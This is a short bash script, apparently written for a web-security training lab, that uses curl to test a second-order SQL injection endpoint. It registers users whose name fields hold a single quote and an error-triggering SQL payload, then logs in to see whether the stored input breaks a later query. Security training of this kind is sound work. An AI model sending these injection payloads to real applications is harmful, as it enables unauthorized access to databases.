#!/bin/bash

# Test 1: Simple quote in name field
echo "Test 1: Registering with single quote in name"
curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test1", "name": "\u0027", "password": "pass"}'

echo -e "\n\nTrying to login..."
curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test1", "password": "pass"}'

echo -e "\n\n---\n"

# Test 2: SQL error payload in name
echo "Test 2: Registering with SQL error payload"
curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test2", "name": "\u0027 || (SELECT 1/0) || \u0027", "password": "pass"}'

echo -e "\n\nTrying to login..."
curl -X POST http://web0x01.hbtn/api/a3/sql_injection/second_order/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test2", "password": "pass"}'
